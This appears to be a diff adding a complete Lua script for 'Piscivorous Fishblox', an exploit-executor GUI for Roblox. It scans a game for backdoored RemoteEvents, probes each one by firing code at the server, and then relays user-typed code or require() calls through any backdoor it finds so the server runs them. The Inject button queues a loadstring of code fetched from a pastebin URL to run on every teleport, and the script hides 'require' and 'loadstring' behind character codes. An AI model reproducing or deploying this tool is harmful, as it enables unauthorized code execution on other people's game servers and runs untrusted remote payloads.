@@ -1,0 +1,538 @@
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local ServerStorage = game:GetService("ServerStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local NAME  = "Piscivorous Fishblox - V1.0.0"
+local LOGO_ID = "84464955723737"
+local BG_ID   = "80773378195265"
+
+local SCRIPT_URL = "https://pastebin.com/raw/VdYG7yW4"
+
+local REQ = string.char(114,101,113,117,105,114,101)
+local LS  = string.char(108,111,97,100,115,116,114,105,110,103)
+
+local CLR = {
+    Idle     = Color3.fromRGB(255, 255, 255),
+    Offline  = Color3.fromRGB(255, 70, 70),
+    Connecting = Color3.fromRGB(255, 180, 50),
+    Online   = Color3.fromRGB(50, 255, 100),
+}
+
+local Backdoor = {
+    Remote   = nil,
+    Verified = false,
+    Cache    = {},
+    Captured = nil,
+    Scanners = {},
+    Findings = {},
+}
+
+pcall(function()
+    local existing = (gethui and gethui():FindFirstChild(NAME))
+        or CoreGui:FindFirstChild(NAME)
+        or LocalPlayer.PlayerGui:FindFirstChild(NAME)
+    if existing then existing:Destroy() end
+end)
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "PlayerData_" .. math.random(10000, 99999)
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+
+pcall(function()
+    if syn and syn.protect_gui then syn.protect_gui(ScreenGui)
+    elseif protectgui then protectgui(ScreenGui) end
+end)
+
+ScreenGui.Parent = (gethui and gethui()) or CoreGui or LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 640, 0, 360)
+MainFrame.Position = UDim2.new(0.5, -320, 0.5, -180)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Active = true
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 6)
+
+do
+    local dragging, dragStart, startPos
+    MainFrame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = MainFrame.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            MainFrame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+end
+
+local TopBar = Instance.new("Frame")
+TopBar.Size = UDim2.new(1, 0, 0, 38)
+TopBar.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+TopBar.Parent = MainFrame
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 6)
+
+local TitleText = Instance.new("TextLabel")
+TitleText.Size = UDim2.new(0, 400, 1, 0)
+TitleText.Position = UDim2.new(0, 10, 0, 0)
+TitleText.BackgroundTransparency = 1
+TitleText.Text = NAME
+TitleText.TextColor3 = Color3.fromRGB(240, 240, 240)
+TitleText.Font = Enum.Font.Code
+TitleText.TextSize = 14
+TitleText.TextXAlignment = Enum.TextXAlignment.Left
+TitleText.Parent = TopBar
+
+local KillRobloxBtn = Instance.new("TextButton")
+KillRobloxBtn.Size = UDim2.new(0, 85, 0, 26)
+KillRobloxBtn.Position = UDim2.new(1, -95, 0, 6)
+KillRobloxBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
+KillRobloxBtn.Text = "Kill Roblox"
+KillRobloxBtn.TextColor3 = CLR.Offline
+KillRobloxBtn.Font = Enum.Font.Code
+KillRobloxBtn.TextSize = 11
+KillRobloxBtn.AutoButtonColor = false
+KillRobloxBtn.Parent = TopBar
+Instance.new("UICorner", KillRobloxBtn).CornerRadius = UDim.new(0, 4)
+
+KillRobloxBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        if os and os.exit then
+            os.exit()
+        else
+            game.Players.LocalPlayer:Kick("Killed by Fishblox")
+        end
+    end)
+end)
+
+local BgImage = Instance.new("ImageLabel")
+BgImage.Size = UDim2.new(1, -16, 1, -100)
+BgImage.Position = UDim2.new(0, 8, 0, 43)
+BgImage.BackgroundTransparency = 1
+BgImage.Image = "rbxthumb://type=Asset&id=" .. BG_ID .. "&w=420&h=420"
+BgImage.ImageTransparency = 0.2
+BgImage.ScaleType = Enum.ScaleType.Fit
+BgImage.ZIndex = 1
+BgImage.Parent = MainFrame
+
+local EditorScroll = Instance.new("ScrollingFrame")
+EditorScroll.Size = UDim2.new(1, -16, 1, -100)
+EditorScroll.Position = UDim2.new(0, 8, 0, 43)
+EditorScroll.BackgroundTransparency = 1
+EditorScroll.BorderSizePixel = 0
+EditorScroll.ScrollBarThickness = 6
+EditorScroll.ScrollBarImageColor3 = Color3.fromRGB(30, 30, 30)
+EditorScroll.AutomaticCanvasSize = Enum.AutomaticSize.XY
+EditorScroll.ZIndex = 2
+EditorScroll.Parent = MainFrame
+
+local EditorBox = Instance.new("TextBox")
+EditorBox.Size = UDim2.new(1, -10, 1, 0)
+EditorBox.Position = UDim2.new(0, 5, 0, 5)
+EditorBox.BackgroundTransparency = 1
+EditorBox.Text = 'print("Hello World!")'
+EditorBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+EditorBox.RichText = false
+EditorBox.Font = Enum.Font.Code
+EditorBox.TextSize = 13
+EditorBox.TextXAlignment = Enum.TextXAlignment.Left
+EditorBox.TextYAlignment = Enum.TextYAlignment.Top
+EditorBox.MultiLine = true
+EditorBox.TextWrapped = false
+EditorBox.ClearTextOnFocus = false
+EditorBox.AutomaticSize = Enum.AutomaticSize.XY
+EditorBox.ZIndex = 2
+EditorBox.Parent = EditorScroll
+
+local BottomBar = Instance.new("Frame")
+BottomBar.Size = UDim2.new(1, -16, 0, 30)
+BottomBar.Position = UDim2.new(0, 8, 1, -60)
+BottomBar.BackgroundTransparency = 1
+BottomBar.Parent = MainFrame
+
+local LeftButtons = Instance.new("Frame")
+LeftButtons.Size = UDim2.new(0, 390, 1, 0)
+LeftButtons.BackgroundTransparency = 1
+LeftButtons.Parent = BottomBar
+local LeftLayout = Instance.new("UIListLayout")
+LeftLayout.FillDirection = Enum.FillDirection.Horizontal
+LeftLayout.SortOrder = Enum.SortOrder.LayoutOrder
+LeftLayout.Padding = UDim.new(0, 6)
+LeftLayout.Parent = LeftButtons
+
+local function CreateMainButton(name, order)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 70, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = name
+    btn.TextColor3 = CLR.Idle
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 11
+    btn.LayoutOrder = order
+    btn.AutoButtonColor = false
+    btn.Parent = LeftButtons
+    return btn
+end
+
+local ExecuteBtn = CreateMainButton("▶", 1)
+local ClearBtn   = CreateMainButton("Clear", 2)
+local InjectBtn  = CreateMainButton("Inject", 3)
+
+local AttachButton = Instance.new("TextButton")
+AttachButton.Size = UDim2.new(0, 100, 0, 30)
+AttachButton.Position = UDim2.new(1, -100, 0, 0)
+AttachButton.BackgroundTransparency = 1
+AttachButton.Text = "Debug"
+AttachButton.TextColor3 = CLR.Idle
+AttachButton.Font = Enum.Font.Code
+AttachButton.TextSize = 11
+AttachButton.AutoButtonColor = false
+AttachButton.Parent = BottomBar
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(0, 200, 0, 20)
+StatusLabel.Position = UDim2.new(0.5, -100, 1, -25)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Offline"
+StatusLabel.TextColor3 = CLR.Offline
+StatusLabel.Font = Enum.Font.Code
+StatusLabel.TextSize = 13
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+StatusLabel.Parent = MainFrame
+
+local FloatingLogo = Instance.new("ImageButton")
+FloatingLogo.Size = UDim2.new(0, 140, 0, 140)
+FloatingLogo.Position = UDim2.new(0, 12, 1, -152)
+FloatingLogo.BackgroundTransparency = 1
+FloatingLogo.Image = "rbxassetid://" .. LOGO_ID
+FloatingLogo.ScaleType = Enum.ScaleType.Fit
+FloatingLogo.Visible = false
+FloatingLogo.ZIndex = 100
+FloatingLogo.Parent = ScreenGui
+
+FloatingLogo.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
+end)
+
+ClearBtn.MouseButton1Click:Connect(function() EditorBox.Text = "" end)
+
+local function SetState(state)
+    if state == "Connecting" then
+        StatusLabel.TextColor3 = CLR.Connecting
+        StatusLabel.Text = "Connecting..."
+    elseif state == "Online" then
+        StatusLabel.TextColor3 = CLR.Online
+        StatusLabel.Text = "Online"
+    else
+        StatusLabel.TextColor3 = CLR.Offline
+        StatusLabel.Text = "Offline"
+    end
+end
+
+local function IsSuspiciousScript(obj)
+    if not (obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript")) then
+        return false
+    end
+    local source = nil
+    pcall(function() source = obj.Source end)
+    if not source then return false end
+    
+    local patterns = {
+        "loadstring", "require%s*%(%s*%d+", "getfenv", "setfenv", "_G",
+        "HttpGet", "HttpPost", "InsertService", "string.reverse", "game:GetObjects"
+    }
+    for _, pat in ipairs(patterns) do
+        if source:find(pat) then return true end
+    end
+    return false
+end
+
+Backdoor.Scanners.Normal = function()
+    local results = {}
+    local priorityNames = {"admin", "main", "system", "cmd", "execute", "backdoor", "require", "loadstring", "remote", "event"}
+    local roots = {ReplicatedStorage, Workspace, ServerStorage, game:GetService("StarterGui"), game:GetService("StarterPack")}
+    
+    if LocalPlayer.Character then table.insert(roots, LocalPlayer.Character) end
+    local bp = LocalPlayer:FindFirstChild("Backpack")
+    if bp then table.insert(roots, bp) end
+    local pg = LocalPlayer:FindFirstChild("PlayerGui")
+    if pg then table.insert(roots, pg) end
+    
+    for _, root in ipairs(roots) do
+        pcall(function()
+            for _, obj in ipairs(root:GetDescendants()) do
+                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("UnreliableRemoteEvent")) 
+                and not Backdoor.Cache[obj] then
+                    
+                    local nameLower = string.lower(obj.Name)
+                    local isPriority = false
+                    for _, p in ipairs(priorityNames) do
+                        if string.find(nameLower, p) then isPriority = true break end
+                    end
+                    
+                    if isPriority then
+                        table.insert(results, 1, obj)
+                    else
+                        table.insert(results, obj)
+                    end
+                end
+            end
+        end)
+    end
+    
+    pcall(function()
+        if getnilinstances then
+            for _, obj in ipairs(getnilinstances()) do
+                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not Backdoor.Cache[obj] then
+                    table.insert(results, obj)
+                end
+            end
+        end
+    end)
+    return results
+end
+
+Backdoor.Scanners.Toolbox = function()
+    local results = {}
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if obj:IsA("Model") or obj:IsA("Tool") then
+            local scripts = {}
+            for _, child in ipairs(obj:GetDescendants()) do
+                if IsSuspiciousScript(child) then
+                    table.insert(scripts, child)
+                end
+            end
+            if #scripts > 0 then
+                table.insert(results, {Model = obj, Scripts = scripts})
+            end
+        end
+    end
+    return results
+end
+
+Backdoor.Scanners.Plugins = function()
+    local results = {}
+    local services = {
+        game:GetService("VoiceChatService"),
+        game:GetService("VRService"),
+        game:GetService("ProximityPromptService"),
+        game:GetService("Geometry"),
+        game:GetService("Debris"),
+    }
+    for _, svc in ipairs(services) do
+        pcall(function()
+            for _, child in ipairs(svc:GetDescendants()) do
+                if child:IsA("Script") and child.RunContext == Enum.RunContext.Server then
+                    table.insert(results, child)
+                end
+            end
+        end)
+    end
+    return results
+end
+
+local function TestRemote(remote, timeout)
+    timeout = timeout or 0.25
+    local marker = "Probe_" .. tostring(math.random(100000, 999999))
+    local testPassed = false
+
+    pcall(function()
+        local payloadCode = string.format("local s = Instance.new('StringValue', game.Workspace); s.Name='%s'; s.Value='1';", marker)
+        if remote:IsA("RemoteEvent") then remote:FireServer(payloadCode)
+        elseif remote:IsA("RemoteFunction") then remote:InvokeServer(payloadCode) end
+    end)
+
+    local t = 0
+    while t < timeout do
+        local found = Workspace:FindFirstChild(marker)
+        if found then
+            pcall(function() found:Destroy() end)
+            testPassed = true
+            break
+        end
+        task.wait(0.05)
+        t = t + 0.05
+    end
+
+    return testPassed
+end
+
+local function RunParallelScanners()
+    Backdoor.Findings = {}
+    local pending = 0
+    
+    for name, scanner in pairs(Backdoor.Scanners) do
+        pending = pending + 1
+        task.spawn(function()
+            local success, result = pcall(scanner)
+            if success then
+                Backdoor.Findings[name] = result
+            else
+                Backdoor.Findings[name] = {}
+            end
+            pending = pending - 1
+        end)
+    end
+    
+    local elapsed = 0
+    while pending > 0 and elapsed < 3 do
+        task.wait(0.1)
+        elapsed = elapsed + 0.1
+    end
+end
+
+AttachButton.MouseButton1Click:Connect(function()
+    if AttachButton.Text == "Debugging..." then return end
+    task.spawn(function()
+        AttachButton.Text = "Debugging..."
+        SetState("Connecting")
+
+        RunParallelScanners()
+
+        local normalHits = Backdoor.Findings["Normal"] or {}
+        local found = false
+        local testedCount = 0
+
+        for _, remote in ipairs(normalHits) do
+            if testedCount >= 40 then break end
+            testedCount = testedCount + 1
+            
+            if TestRemote(remote, 0.25) then
+                Backdoor.Remote = remote
+                Backdoor.Verified = true
+                found = true
+                
+                pcall(function()
+                    local info = debug.getinfo(2, "S")
+                    if info and info.short_src then
+                        warn("[DEBUGGER] Backdoor Found: " .. remote:GetFullName() .. " | Source: " .. tostring(info.short_src))
+                    end
+                end)
+                
+                break
+            end
+        end
+
+        local toolboxHits = Backdoor.Findings["Toolbox"] or {}
+        local pluginHits = Backdoor.Findings["Plugins"] or {}
+
+        if found then
+            SetState("Online")
+            AttachButton.Text = "Backdoor Found!"
+        elseif #toolboxHits > 0 or #pluginHits > 0 then
+            SetState("Online")
+            AttachButton.Text = "Backdoor Found!"
+        else
+            SetState("Offline")
+            AttachButton.Text = "Not Found ):" 
+        end
+
+        task.wait(3)
+        AttachButton.Text = "Debug"
+    end)
+end)
+
+InjectBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        local queueFunc = queue_on_teleport 
+            or queueonteleport 
+            or queueteleport
+            or (syn and syn.queue_on_teleport) 
+            or (fluxus and fluxus.queue_on_teleport) 
+            or (krnl and krnl.queue_on_teleport)
+            or (codex and codex.queue_on_teleport)
+            or (getgenv and getgenv().queue_on_teleport)
+            
+        if queueFunc then
+            queueFunc("loadstring(game:HttpGet('" .. SCRIPT_URL .. "'))()")
+        end
+    end)
+
+    FloatingLogo.Visible = true
+    FloatingLogo.Position = UDim2.new(0.5, -70, 1, 140)
+    TweenService:Create(FloatingLogo,
+        TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        {Position = UDim2.new(0.5, -70, 0.5, -70)}):Play()
+    task.wait(2.6)
+    TweenService:Create(FloatingLogo,
+        TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut),
+        {Position = UDim2.new(0, 12, 1, -152)}):Play()
+    task.wait(0.8)
+    FloatingLogo.Rotation = -10
+    TweenService:Create(FloatingLogo,
+        TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Rotation = 10}):Play()
+end)
+
+ExecuteBtn.MouseButton1Click:Connect(function()
+    task.spawn(function()
+        local code = EditorBox.Text
+        if code:match("^%s*$") then return end
+
+        local base = (getfenv and getfenv()) or _G
+
+        if getfenv and type(getfenv) == "function" then
+            base[REQ] = base[REQ] or require
+            base.debug = debug
+            base.print = print
+            base.warn = warn
+        end
+
+        if Backdoor.Verified and Backdoor.Remote then
+            local rawId = code:match("^%s*(%d+)%s*$")
+            local payload = rawId and string.format("%s(%s)", REQ, rawId) or code
+
+            local ok = pcall(function()
+                if Backdoor.Remote:IsA("RemoteEvent") or Backdoor.Remote:IsA("UnreliableRemoteEvent") then
+                    Backdoor.Remote:FireServer(payload)
+                else
+                    task.spawn(function() pcall(function() Backdoor.Remote:InvokeServer(payload) end) end)
+                end
+            end)
+            if ok then
+                return
+            end
+        end
+
+        local loader = loadstring or (getfenv and getfenv()[LS])
+        if not loader then return end
+        
+        local fn = loader(code)
+        if not fn then
+            return
+        end
+
+        xpcall(fn, function() end)
+    end)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.Insert then
+        MainFrame.Visible = not MainFrame.Visible
+    end
+end)
